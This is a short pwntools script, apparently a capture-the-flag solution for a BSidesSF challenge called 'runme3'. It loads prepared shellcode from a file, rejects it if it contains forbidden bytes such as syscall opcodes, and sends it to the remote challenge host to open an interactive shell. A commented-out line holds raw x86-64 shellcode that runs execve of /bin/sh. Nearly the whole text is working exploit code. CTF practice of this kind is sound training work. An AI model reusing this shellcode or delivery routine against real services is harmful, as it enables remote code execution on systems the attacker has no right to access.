from pwn import *

# shellcode = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'

shellcode = open("./prepared.bin", "rb").read()

if any([x in [0x00, 0xcd, 0x80, 0x0f, 0x05] for x in shellcode]):
	print("Not allowed bytes")
else:
	elf = context.binary = ELF("./runme")

	# p = gdb.debug(elf.path)
	# p = process(elf.path)
	p = remote('runme3-3f8ecff9.challenges.bsidessf.net', 1337)

	print(p.recvline())
	p.sendline(shellcode)
	p.interactive()



